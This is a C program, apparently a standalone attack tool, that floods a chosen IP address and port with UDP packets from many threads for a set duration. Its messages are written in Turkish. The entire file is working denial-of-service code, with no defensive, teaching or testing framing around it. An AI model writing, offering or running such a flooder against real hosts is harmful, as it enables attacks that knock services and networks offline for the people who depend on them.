#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

char *target_ip;
int target_port, packet_size, thread_count, duration;

void *flood(void *arg) {
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    char *data = malloc(packet_size);
    memset(data, 'A', packet_size);

    time_t end_time = time(NULL) + duration;
    while (time(NULL) < end_time) {
        sendto(sock, data, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    free(data);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Kullanım: %s <ip> <port> <packet_size> <thread> <time>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    packet_size = atoi(argv[3]);
    thread_count = atoi(argv[4]);
    duration = atoi(argv[5]);

    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Flood işlemi tamamlandı.\n");
    return 0;
}
